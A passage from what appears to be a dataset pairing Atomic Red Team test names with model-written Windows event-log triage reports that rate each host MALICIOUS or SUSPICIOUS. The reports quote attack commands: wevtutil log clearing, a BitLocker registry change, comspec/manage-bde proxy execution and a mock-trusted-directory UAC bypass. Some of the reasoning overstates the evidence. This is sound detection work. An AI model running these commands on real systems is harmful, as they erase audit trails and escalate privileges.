1. **Event Log Clearing (Event ID 104 and 1102):** 
   - Multiple logs have been cleared, including System, Security, and Windows PowerShell logs. This is a common tactic used by attackers to hide their tracks and makes it challenging to track activities.
   - The log clearing was performed by the user ""admin_test,"" which may indicate either an internal user with rogue behaviors or compromised credentials.

2. **Sysmon Logs and Windows PowerShell Execution:**
   - There is a suspicious PowerShell command execution shown in the Windows PowerShell logs, which involves starting a process with the executable `ninja_syscall1.exe`. The path and application name suggest usage with penetration testing or attack simulation frameworks (e.g., Atomic Red Team scripts), which can also be indicators of a real attack if not part of legitimate testing activities.
   - The command includes conditional logic to remove a file, `hello.log`, which might be an attempt to clean up or hide evidence of execution.

3. **Process Creation and Command Line Usage:**
   - Multiple executions of `wevtutil.exe` were used to clear logs, a known behavior associated with threat actors.
   - `whoami.exe`, `hostname.exe`, and `PowerShell.exe` used in the context of gathering information or executing further commands. 

4. **Use of Temporary and System Directories:**
   - Executables running from temporarily directories like `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam` can be suspicious unless they are part of scheduled vulnerability assessments or internal security checks.

5. **Security Auditing Events (Event ID 5379):**
   - Multiple failed credential access attempts for an account with identifier `02txoixylodcstop`, which is not a standard account naming convention, suggesting possible brute force or enumeration attempts.

Taken together, these observations suggest a high likelihood of malicious activity on the host. The combination of evidence covers typical stages of an attack lifecycle: privilege escalation, execution of malicious tools, and log tampering.

Delete a single file - Windows PowerShell,"Upon reviewing the provided log entries, several points of interest emerge, which potentially indicate suspicious activity:

### Indicators of Malicious Activity:

1. **PowerShell Execution**: 
   - Numerous PowerShell logs show the removal of a temporary file (`deleteme_T1551.004`). This action could relate to malicious activity, especially given the timing and repetition, though by itself does not necessarily mean compromise.

2. **Event Log Clearing**:
   - Both System and Security logs show event clearing (`EventID 104` and `1102`), with entries indicating that the logs have been purged. Clearing logs can obfuscate malicious activity and is a common method employed by adversaries to cover tracks.

3. **Sysmon Logs**:
   - There are multiple instances where `wevtutil.exe`, a Windows utility, is employed to clear logs (`wevtutil.exe cl System`, `Application`, `Security`, and `Windows PowerShell`). This direct manipulation of logs is highly suspicious and indicative of potential malicious intent.

4. **Process Executions**:
   - A specific user (`SERVER002\\admin_test`) continually executed these suspicious actions. The user's execution of PowerShell scripts and the clearing of logs underlines the possibility that this account could be compromised or misused.

5. **Microsoft Edge Update Activity**:
   - The logs display automated and seemingly benign Edge updates. However, it is worth verifying the integrity and source of these updates to ensure no tampering or abuse.

### Recommendations:

- **Immediate Investigation**: Further investigation is necessary for the user account `admin_test`, especially around its recent activities and access logs.
- **Forensic Analysis**: Retrieve shadow copies or backups, if available, of the cleared logs to investigate suppressed evidence of compromise.
- **Monitoring**: Increase monitoring on the account and employ more stringent access controls or multifactor authentication to prevent unauthorized access.
- **Security Audits**: Conduct a complete audit of executed scripts and running processes on the system to detect any anomalous or unauthorized software executions or installations.

### Resolution:

Given the presence of these activities, such as event log clearing and non-standard use of PowerShell, the situation seems highly indicative of possible malicious intent. Thus, the resolution for these logs is:

- **MALICIOUS**: These logs show signs of known malicious activities (e.g., event log clearing, PowerShell misuse) that need immediate attention and a comprehensive security response."
Modify Internet Zone Protocol Defaults in Current User Registry - cmd,"Based on the provided log entries, I conducted a thorough analysis to identify any indication of suspicious or malicious activity on the Windows host.

### Analysis of Logs:

1. **Log Clearing Events:**
   - There are several instances of event log clearing, highlighted by Event ID 104 in the System log indicating a log file has been cleared by the user ""admin_test"". The logs cleared are the System, Windows PowerShell, and Security logs. Log clearing can often be an indication of an attempt to cover up malicious activity.
   - Sysmon logs confirm the use of `wevtutil.exe` command-line utility to clear logs. This tool can be used maliciously to cover tracks by clearing event logs.

2. **Registry Modification Using CMD and REG.EXE:**
   - Sysmon logs indicate the execution of a command modifying registry settings through `cmd.exe` using `reg.exe`, setting `http` and `https` protocol defaults to `0`, which is atypical behavior and potentially indicative of malicious intent to alter system settings or configurations.

3. **System Time Change:**
   - Security logs (Event ID 4616) and System logs indicate a change in the system time by `svchost.exe`. While such changes can occur for legitimate reasons (such as synchronization with a time server), they can also be used to disrupt log timelines, making it harder to reconstruct activities.

4. **Microsoft Edge Update:**
   - The Application and Sysmon logs reveal various activities related to Microsoft Edge Update. The processes are running under `NT AUTHORITY\SYSTEM`, which suggests these actions are likely authorized updates, but frequent and timed execution of update executables could be worth monitoring to rule out any misuse of the update mechanism.

### Assessment:

Given the pattern and nature of activities observed in the logs:

- **Log Clearing:** The clearing of critical logs (System, PowerShell, Security) by `admin_test` is a significant red flag, often associated with malicious activity.
- **Registry Modifications:** Unusual and unauthorized registry modifications further confirm potential malicious activity.
- **System Time Manipulation:** Combined with other indicators, this contributes to the suspicious context.

### Conclusion:

- **Resolution: MALICIOUS**

The coordinated actions of log clearing, unauthorized registry modifications, and potentially deceitful timestamp changes strongly indicate malicious intent. Immediate investigation and containment are recommended to prevent further compromise.

### Guidance on How to Proceed:

1. **Immediate Response:**
   - Isolate the machine ""Server002"" from the network to prevent further spread or interaction by the attacker.
   - Preserve the current state for forensic analysis by taking a snapshot or full disk image.

2. **In-depth Forensic Analysis:**
   - Verify the actions of the ""admin_test"" account, check for potential account compromise, and investigate any additional unauthorized accesses or unusual behavior.
   - Analyze the entire system and security configuration to ensure no other vulnerabilities are present.

3. **Security Enhancements:**
   - Implement continuous monitoring and alerting, especially for log clearing and registry modification attempts.
   - Ensure system logging is properly configured to prevent unauthorized clearing, and conduct regular security audits.

4. **Patch Management:**
   - Ensure all software, including third-party applications like browsers, are updated to their latest secure versions.

Taking proactive steps to handle and mitigate these identified issues will reduce the risk of potential future attacks and operational disruptions."
Invoke CHM with Script Engine and Help Topic,"The logs from the Windows host present several indications of suspicious and potentially malicious activities. Below is a detailed analysis of notable events:

1. **Clearing of Event Logs:**
   - **Security Log:** Event ID 1102 indicates that the security log was cleared. This is often a step taken by malicious actors to cover their tracks and hinder forensic investigations.
   - **Sysmon Log Clearing Attempts:** The usage of `wevtutil.exe` with the command line arguments `cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, `cl System`, `cl Security`, and `cl ""Windows PowerShell""` within a very short timeframe implies an attempt to clear multiple event logs programmatically. This behavior is highly indicative of a potential compromise.

2. **Execution of PowerShell with Obfuscated Commands:**
   - There is a PowerShell execution (`powershell.exe`) with the command line `Invoke-ATHCompiledHelp`. This command appears obfuscated and non-standard, suggesting the potential use of PowerShell scripts for executing malicious payloads or commands. The use of external commands such as `Invoke-ATHCompiledHelp` is particularly suspicious as it could be an indicator of script-based attacks or exploitation.

3. **Unusual System Utilities Usage:**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` were executed in rapid succession by the user `admin_test` with high integrity levels. Given the context, these utilities could be used to facilitate log clearance and execution environment maintenance typically seen in attacks.

4. **Privilege Level and User Account:**
   - The activities were carried out under a user account `admin_test`, which appears to have administrative privileges. The use of such an account combined with high integrity level processes raises concerns about malicious intent.

5. **Temporal and Contextual Correlation:**
   - The events, especially the log clearance activities, occur within a very tight timeframe, suggesting a coordinated set of activities aimed at persisting or executing a malicious operation without leaving a trace.

**Assessment and Resolution:**
Based on the analysis above, the events exhibit significant indicators of malicious behavior, specifically related to attempts to hide activities by clearing logs and using potentially malicious PowerShell commands. The detailed sequence of events, combined with the type of commands executed, elevates the risk of a security compromise on this host.

**Resolution: MALICIOUS**
Given the evidenced log clearance and suspicious command executions, these activities are deemed malicious. Immediate action should be taken to isolate the impacted system, carry out a detailed forensic investigation, and review the activities of the user account involved to contain and remediate any potential security incidents."
UACME Bypass Method 31,"Upon analyzing the provided Windows event logs, several potential indicators of both suspicious and malicious activities were identified.

### Suspicious and Malicious Activity Indicators:
1. **Event Log Clearing:**
   - **Event ID 1102 in Security Log:** Indicates that the security log was cleared by user ""admin_test"" on computer ""SERVER002"".
   - **Event ID 104 in System Log:** Similarly, the System and Windows PowerShell logs were also cleared. Clearing event logs can be an indication of malicious activity aiming to hide traces.

2. **Command Execution with Potential Malicious Intent:**
   - **Cmd.exe Execution:** A Sysmon Event ID 1 shows `cmd.exe` was executed with suspicious command lines pointing towards `AtomicRedTeam` and `Akagi64.exe`, which is an indication of execution related to security testing or potential abuse of the tool for malicious activity.

3. **Use of `wevtutil.exe` for Log Clearing:**
   - Sysmon logs indicate multiple executions of `wevtutil.exe` with commands to clear logs (`wevtutil.exe cl Security`, `wevtutil.exe cl System`, `wevtutil.exe cl Application`), corroborating the actions found in Security and System logs. This is often used by attackers to cover their tracks.

4. **Potential UAC Bypass:**
   - The file `Akagi64.exe` referenced in the command line is known for privilege escalation through User Account Control (UAC) bypass, which is a red flag indicating potential malicious intent.

5. **Edge Update Executions:**
   - There are consistent entries related to Edge updates which appear benign—common in enterprise environments, but should still be noted if not expected.

### Assessment:
- **Malicious Indicators:** The clearing of logs, usage of cmd.exe with suspicious command lines, and execution of known privilege escalation tools (Akagi64.exe) strongly indicate malicious activity. Event logs clearing is a direct attempt to delete traces of actions performed, adding to the evidence.

### Resolution:
Based on the activities identified, the presence of malicious intent is evident within the log entries. The combination of log clearing, suspicious command line executions, and potential use of tools for privilege escalation renders the actions observed as **MALICIOUS**.

### Guidance:
- Immediate steps to identify the user ""admin_test"" and terminate their session to prevent further harmful activities.
- Analyze other system logs and network traffic for signs of lateral movement or data exfiltration.
- Strengthen monitoring and alerting for events related to log clearing and suspicious command executions.
- Conduct a full forensic investigation of ""Server002"" to assess the full scope of the impact."
Modify UseTPMKey Registry entry,"## Detailed Analysis of Windows Event Logs

### Overview
These logs represent a sequence of activities that occurred on a Windows machine. A comprehensive analysis of the provided Sysmon, Application, Security, System, and PowerShell logs reveals a series of events that require thorough examination to identify potential security threats or malicious activities. 

### Key Observations:

1. **Sysmon Logs:**
   - Frequent executions of `wevtutil.exe`, an Eventing Command Line Utility, are observed. This utility is used for managing event logs, which may include actions like clearing logs — an activity that could be indicative of malicious attempts to cover tracks.
   - The execution of `cmd.exe` with a command to modify registry keys using `reg add`. This specific command (`reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMKey /t REG_DWORD /d 2 /f`) shows a potential modification to BitLocker policies, which poses a security risk if unauthorized.
   - Other usual processes like `conhost.exe` (Console Window Host) are invoked multiple times, serving typically as a host for console applications.

2. **Security Logs:**
   - Event ID 1102 indicates the clearing of event logs, which generally follows suspicious activity. The user `admin_test` was involved in this operation.
   - Security events like time change/activity adjustments are logged. However, this appears in isolated instances with no immediate correlation to potential privileges escalation or direct vulnerabilities.

3. **Application Logs:**
   - Entries marking the stopping of `EdgeUpdate` services. These seem routine at the surface level unless correlated with other logs indicating a security breach.
   
4. **System Logs:**
   - Events related to the clearing of logs, specifically linked to different channels including System and Windows PowerShell. Such activity suggests an intent to modify or review security-related configurations without leaving a trace.

5. **Indicators of Possible Malicious Activity:**
   - The combination of `wevtutil.exe` usage to clear logs and `reg.exe` execution by `cmd.exe` for registry changes strongly suggests an effort to execute unauthorized changes while attempting to obscure these actions.

### Assessment of the Situation

- **Activity Analysis:**
  The Sysmon logs indicate repetitive use of utilities (`wevtutil.exe`, `conhost.exe`, and `cmd.exe`) that while benign under certain circumstances, can also hint towards unauthorized user action trying to manipulate system settings or covering tracks (log clearing).

- **Threats Identified:**
  - **Registry Modification via `cmd.exe`:** This indicates a manipulation, specifically targeting security policy configurations, which can potentially be malicious if performed by an unauthorized user.
  - **Logs Clearing Activity:** Actions performed by `admin_test` that attempt to clear logs suggest potentially unauthorized changes that are being masked.

### Conclusion: SUSPICIOUS

The activity witnessed across these event logs cannot be immediately labeled as definitively malicious due to possible context-specific operational maintenance by administrators with legitimate intent. However, given the sequence of commands and actions (especially registry modifications and logs clearing) without explicit justification or audit trails, this activity should be marked as **Suspicious**.

### Guidance for Further Action

1. **Immediate Steps:**
   - Conduct a thorough review with the system administrators or users involved (`admin_test`) to verify intentionality behind the logs-clearing and registry modifications.
   - Verify the source and authorization of `reg.exe` command executions.

2. **Mitigation & Prevention:**
   - Implement stricter auditing and alerting on critical registry changes.
   - Reinforce policies against unauthorized event log clearing and ensure that such activities are logged and monitored diligently.

3. **Further Investigation:**
   - Assess for potential unauthorized access or privilege escalation by analyzing user login patterns and any deviations in expected behavior.
   - Consider deploying enhanced monitoring solutions to capture similar activities in real-time for quicker response. 

This incident requires a continued investigation to ensure that no genuinely malicious actions have been overlooked, and to implement timescales for closing any identified vulnerabilities uncovered by this review."
Masquerading - wscript.exe running as svchost.exe,"Upon analysis of the provided logs, several events stand out that may indicate potential suspicious activity:

1. **Event Log Clearing**:
   - Multiple entries indicate that admin_test cleared event logs, including Security, System, and Windows PowerShell logs (EventID 1102 in the Security log and EventID 104 in the System log).
   - The clearing of logs without a legitimate reason or notification is generally suspicious, as attackers often clear logs to cover their tracks.

2. **Unusual Process Execution**:
   - **Sysmon Logs**: The event involving `wevtutil.exe` with high integrity level to clear Security logs (`cl Security`) is prominent.
   - Similarly, `cmd.exe` commands were observed where it copied `wscript.exe` and renamed it to `svchost.exe` in the AppData path. This behavior is abnormal and indicative of masquerading, a technique to disguise malicious activity.
   - The execution of `whoami.exe`, `hostname.exe`, and other utilities like PowerShell can be legitimate, but due to timing and association with other suspicious activities, they need further scrutiny.

3. **Suspicious Commands**:
   - The Sysmon log shows the execution of `cmd.exe` with a command line to run a `.vbs` script (`T1036.003_masquerading.vbs`), pointing towards a potential execution of a script that is generally used to demonstrate or test attack techniques (commonly used in security training scenarios as ""Atomic Red Team"" tests).

4. **Anomalous Logon Activity**:
   - A repeated `ReturnCode` of `3221226021` in EventID 5379 is a status code indicating access issues or invalid login attempts via security auditing. While this log alone isn't a definitive indicator, in combination with other suspicious activity, it may indicate unauthorized attempts or failed efforts to access resources.

5. **Descriptive Event Entries**:
   - The use of `wscript.exe` masquerading as `svchost.exe` and executing scripts from a temporary directory indicates typical behavior of an attack simulation possibly run by a legitimate security testing suite like `Atomic Red Team`, suggesting a benign simulation.

### Assessment:
- The clearing of event logs and execution of renaming and running scripts for masquerading, especially using the pattern of known security testing scenarios, strongly suggests this activity is either a security incident or a structured penetration test.

### Conclusion:
- **Resolution**: **SUSPICIOUS**
  - Although there are indicators consistent with testing environments (such as the use of Atomic Red Team scripts), the overall behavior is suspicious outside a controlled or known testing context.
  - Verification is needed regarding whether legitimate security tests were conducted. If not confirmed as sanctioned activity, further investigation is warranted as these patterns closely align with attempts to assess or potentially exploit security weaknesses.

### Guidance:
1. **Verify Legitimacy**: Confirm with the IT operations or security team whether any red teaming or authorized penetration testing took place during these logs' timeframe.
2. **Forensic Imaging and RCA**: If unauthorized activity is verified, ensure forensic imagery of the affected systems is captured and commence a root cause analysis.
3. **Access Review**: Investigate any credentials and audit their usage and permissions, particularly those of admin_test.
4. **Mitigation and Monitoring**: Implement stricter logging policies and monitor for further anomalies to prevent potential exploitation."
manage-bde.wsf Signed Script Command Execution,"Upon reviewing the provided Windows event logs, I have identified several indicators of potentially malicious activity:

1. **Clearing of Event Logs:** 
   - The logs reveal a series of events where different event logs (System, Application, Windows PowerShell) on the host, Server002, were cleared. This action is typically suspicious, as attackers often clear logs to cover their tracks following malicious activity. 
   - The events involved the `wevtutil` utility being used multiple times (Event IDs in Sysmon logs such as 17952, 17955, 17959, etc.), which suggests intentional log clearing.

2. **Command Line and Script Activity:** 
   - In the Sysmon logs, there's a notable command execution where `cmd.exe` is used with a suspicious command line: `\""cmd.exe\"" /c set comspec=%%windir%%\\System32\\calc.exe & cscript %%windir%%\\System32\\manage-bde.wsf`. This suggests potential malware or script that aims to escalate privileges or execute unauthorized tasks (Event ID 17979).
   - Associated with this cmd.exe event, `cscript.exe` was run (Event ID 17981), executing `manage-bde.wsf`, which manipulates or queries BitLocker Drive Encryption. Such actions might indicate attempts to adjust encryption settings or data exfiltration.

3. **Frequent Use of Elevated Utilities:**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` were launched (Sysmon events with IDs such as 17968, 17969). While these processes can be benign, their repeated invocations alongside the actions of clearing multiple event logs adds to the suspicious nature.

4. **Host and User Enumeration:**
   - The presence of `whoami.exe` and `hostname.exe` log entries (Event IDs 17975, 17979) could suggest enumeration activity by a malicious actor attempting to gather information about the system and user context.

Based on these findings, there is a high likelihood of malicious activity due to the combination of log clearing, unusual script execution, and system enumeration. The clearing of the Security log (Event ID 1102) is particularly concerning, as it indicates an attempt to hide or obscure evidence of unauthorized activity.

**Assessment:**
- **Resolution:** MALICIOUS
- The combination of log tampering, unusual script execution, and system enumeration strongly indicates an intrusion intended to maintain persistence or gather sensitive information.

**Guidance:**
1. **Immediate Incident Response:** Treat the situation as an incident and initiate the incident response procedures.
2. **Isolate the Host:** Sever the network connection of the affected host, Server002, to prevent further lateral movement or data exfiltration.
3. **Forensic Investigation:** Conduct a deeper forensic investigation of the system to identify any backdoors, persistence mechanisms, or further indicators of compromise (IOCs).
4. **Log Analysis:** Recover and analyze earlier logs if possible, to identify how the attacker gained access initially.
5. **Review User Accounts:** Investigate the user account `admin_test` for unusual activity and ensure its security.
6. **System Cleanup and Recovery:** Once the investigation is complete, clean the system, patch vulnerabilities, and consider redeploying Server002 if necessary.
7. **Strengthen Monitoring:** Enhance security monitoring to detect similar behaviors in the future.

These actions are intended to mitigate risk, restore trust in the compromised system, and prevent further breaches."
Bypass UAC by Mocking Trusted Directories,"Upon analyzing the Windows event logs provided, I have identified several activities that suggest suspicious and potentially malicious behavior:

1. **Event ID 1102** - Log cleared event:
   - The security log indicates that the logs were cleared by the user `admin_test`. Clearing event logs can be an attempt to cover up malicious activities and is a significant red flag when performed outside of routine maintenance procedures.

2. **Event ID 4624 and 4672** - Logon events:
   - Multiple successful logons and the granting of special privileges were recorded. The user `admin_test` was granted high-level privileges including `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, which are often used by attackers to escalate privileges or pivot within a system. These privileges aren't expected to be frequently enabled for users, and their sudden appearance might indicate privilege escalation exploits.

3. **Suspicious Process Executions**:
   - The `wevtutil.exe` was used multiple times to clear various Windows event logs such as Security, System, and Application logs. This utility is often exploited by attackers to delete specific logs and hide their malicious activities.
   - The `cmd.exe` execution with the command line `""cmd.exe"" /c mkdir ""\\?\C:\Windows \System32\"" & copy ""C:\Windows\System32\cmd.exe"" ""\\?\C:\Windows \System32\mmc.exe"" & mklink c:\testbypass.exe ""\\?\C:\Windows \System32\mmc.exe""` raises concerns. This command is attempting to create a directory name with spaces and employ symbolic links, which could be used in a UAC bypass or to hide extra binaries on the system.

4. **Event Time Changes**:
   - The time was modified on the system (Event IDs 4616 and related Kernel-General events). Time changes can sometimes indicate an attempt to confuse or evade time-based detection mechanisms.

**Assessment and Resolution**:
The actions of clearing logs, use of privilege escalation, suspicious creations of directories and links in critical system spaces, and the manipulation of timestamps are consistent with patterns of an active intrusion or attempts to conceal unauthorized activities. 

Based on this analysis, the resolution is as follows:
- **Resolution: MALICIOUS**
  - Immediate actions should include isolating the system from the network to prevent potential lateral movements, conducting an integrity check of key system files, and beginning a thorough forensic analysis to understand the extent of the compromise and any further actions taken by the attacker. Additionally, review and update policies regarding log handling, user permissions, and system monitoring to prevent similar incidents in the future."
Disabling ShowUI Settings of Windows Error Reporting (WER),"Reviewing the provided Windows event logs for the host ""Server002,"" we can identify several factors that may indicate suspicious or potentially malicious activity.

### Detailed Analysis:
1. **Event Log Clearing:**
   - **Security Log:** The security log shows an event with `EventID 1102`, which indicates that the event log was cleared by the user `admin_test`. This action is suspicious, especially since log clearing is often performed to cover up traces of unauthorized or malicious activity.
   - **System Log:** Events with `EventID 104` show that both the System and Windows PowerShell logs were cleared by `admin_test`. This further reinforces the suspicious nature since clearing multiple logs in rapid succession usually suggests an attempt to hide actions.

2. **Unexpected Command-Line Usage:**
   - There are several instances of `wevtutil.exe` being used to clear logs, such as the Sysmon log, Application log, and ""Windows PowerShell"" log channels. This behavior aligns with the clearing of the logs and is not typical of normal user operations.
   
3. **Registry Modification:**
   - Sysmon logs show a `cmd.exe` process with a command line to alter the Windows Error Reporting settings via `reg.exe`, indicating an attempt to change error reporting behavior, which might be used to suppress error messages to avoid drawing attention during malicious activities.

4. **Process Execution and Agent Activities:**
   - The execution of typical administrative commands like `whoami.exe` and `hostname.exe` by `admin_test` suggests reconnaissance or validation of access after gaining higher privileges. These commands aren't inherently malicious but can be used in the context of an attack during privilege escalation or lateral movement phases.
   - Numerous Edge Update processes seem legitimate as part of software updates, but they occur around the same time as the suspicious activity, possibly to disguise or separate attention from the malicious behavior.

### Assessment:
**Final Resolution: MALICIOUS**

The combination of event log clearing by the user `admin_test` across multiple channels, use of command-line utilities `wevtutil.exe` for clearing logs, command-line changes to registry settings related to error reporting, and potential reconnaissance commands highlights a clear pattern of malicious attempts to obfuscate unauthorized activity on the system.

### Recommendations:
1. **Immediate Response:**
   - Investigate and isolate the host ""Server002"" from the network to prevent further potential damage or spread.
   - Identify and review other actions performed by `admin_test` and related accounts to understand the scope of the activity.
   
2. **Further Investigation:**
   - Conduct a thorough forensic analysis to identify the source of the compromise and any additional affected systems.
   - Examine network logs and connections during the timeframe of these events for external communications.
   
3. **Remediation and Security Enhancement:**
   - Reset credentials and review user accounts for additional suspicious activities.
   - Implement stricter audit policies to monitor log access and ensure immediate alerting on log clearing.
   - Regularly update and patch software to reduce vulnerabilities exploited by attackers."
